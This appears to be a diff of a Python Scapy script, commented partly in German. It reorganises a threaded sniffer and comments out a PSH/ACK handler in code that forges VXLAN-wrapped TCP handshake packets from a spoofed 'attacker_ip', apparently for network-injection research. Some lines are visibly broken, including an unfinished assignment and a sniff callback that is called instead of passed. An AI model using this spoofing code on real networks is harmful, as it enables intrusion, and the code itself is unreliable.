@@ -72,6 +72,46 @@ def syn_ack_do(packet):
         print("")
     return
 
+
+
+
+
+
+
+
+def worker(packet):
+    print (packet.summary())
+    print ("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\r\n\r\n\r\n")
+    return
+
+### Thread Klasse initiieren fuer ACK
+class Sniff_Thread (threading.Thread):
+   def __init__(self):
+      threading.Thread.__init__(self)
+   def run(self):
+      sniff_all_packets()
+
+threads = []
+def start_TCP_IN_Thread(packet):
+    global threads
+    t = threading.Thread(target=worker, args=(packet,))
+    threads.append(t)
+    t.start()
+
+def sniff_all_packets():
+    sniff(session=TCPSession, filter = "tcp port " + str(http_port), prn=start_TCP_IN_Thread(), store=False, count = 5)
+    return
+
+
+
+SNIFFER = Sniff_Thread()
+SNIFFER.start()
+
+
+
+
+
+
 #$$$$$ SEND SYN
 syn = VXLAN / IP(src=attacker_ip,dst=dest) / TCP(sport=s_port, dport=http_port, flags='S')
 send(syn, verbose=0)
@@ -207,63 +247,44 @@ if debug:
 
 
 
-def worker(packet):
-    print (packet.summary())
-
-### Thread Klasse initiieren fuer ACK
-class Sniff_Thread (threading.Thread):
-   def __init__(self):
-      threading.Thread.__init__(self)
-   def run(self):
-      sniff_all_packets()
-
-threads = []
-def start_TCP_IN_Thread(packet):
-    global threads
-    t = threading.Thread(target=worker, args=(packet,))
-    threads.append(t)
-    t.start()
-
-def sniff_all_packets():
-    sniff(session=TCPSession, filter = "tcp port " + str(http_port), prn=start_TCP_in_Thread(), store=False, count = 5)
-    return
 
 
 
 
 
 
-### psh_ack_do ist die Funktion, die beim sniffen des PSH/ACK Pakets ausgefuehrt wird
-# Fuer das folgenden ACK Paket sind folende Parameter wichtig: Dst_Port, ACK#, SEQ#
-def psh_ack_do(packet):
-    global psh_ack_dport
-    psh_ack_dport = packet[TCP].dport
-    global psh_ack_ack
-    psh_ack_ack = packet[TCP].ack
-    global psh_ack_seq
-    psh_ack_seq = packet[TCP].seq
-    global psh_ack_len
-    psh_ack_len = 
-    if debug:
-        print("############## PSH/ACK packet received ##############")
-        print("dport = " + str(psh_ack_dport))
-        print("ACK# = " + str(psh_ack_ack))
-        print("SEQ# = " + str(psh_ack_seq))
-        print("")
-    return
 
-# Auf jedes erhaltene Paket muss ein ACK geschickt werden
-sniff(lfilter = lambda x: x.haslayer(TCP) and x[TCP].flags & ACK and x[TCP].flags & PSH, prn=psh_ack_do, count = 1)
+# ### psh_ack_do ist die Funktion, die beim sniffen des PSH/ACK Pakets ausgefuehrt wird
+# # Fuer das folgenden ACK Paket sind folende Parameter wichtig: Dst_Port, ACK#, SEQ#
+# def psh_ack_do(packet):
+#     global psh_ack_dport
+#     psh_ack_dport = packet[TCP].dport
+#     global psh_ack_ack
+#     psh_ack_ack = packet[TCP].ack
+#     global psh_ack_seq
+#     psh_ack_seq = packet[TCP].seq
+#     global psh_ack_len
+#     psh_ack_len = 
+#     if debug:
+#         print("############## PSH/ACK packet received ##############")
+#         print("dport = " + str(psh_ack_dport))
+#         print("ACK# = " + str(psh_ack_ack))
+#         print("SEQ# = " + str(psh_ack_seq))
+#         print("")
+#     return
 
-#$$$$$ SEND ACK on PSH/ACK
-ack = VXLAN / IP(src=attacker_ip,dst=dest) / TCP(dport=http_port, sport=psh_ack_dport,seq=psh_ack_ack, ack=psh_ack_seq + 1, flags='A')
-out_ack = send(ack, verbose=0)
-if debug:
-        print("############## ACK packet sent #####################")
-        print("srcport = " + str(syn_ack_dport)) 
-        print("ACK# = " + str(syn_ack_seq + 1))
-        print("SEQ# = " + str(syn_ack_ack))
-        print("")
+# # Auf jedes erhaltene Paket muss ein ACK geschickt werden
+# sniff(lfilter = lambda x: x.haslayer(TCP) and x[TCP].flags & ACK and x[TCP].flags & PSH, prn=psh_ack_do, count = 1)
+
+# #$$$$$ SEND ACK on PSH/ACK
+# ack = VXLAN / IP(src=attacker_ip,dst=dest) / TCP(dport=http_port, sport=psh_ack_dport,seq=psh_ack_ack, ack=psh_ack_seq + 1, flags='A')
+# out_ack = send(ack, verbose=0)
+# if debug:
+#         print("############## ACK packet sent #####################")
+#         print("srcport = " + str(syn_ack_dport)) 
+#         print("ACK# = " + str(syn_ack_seq + 1))
+#         print("SEQ# = " + str(syn_ack_ack))
+#         print("")
 
 
 
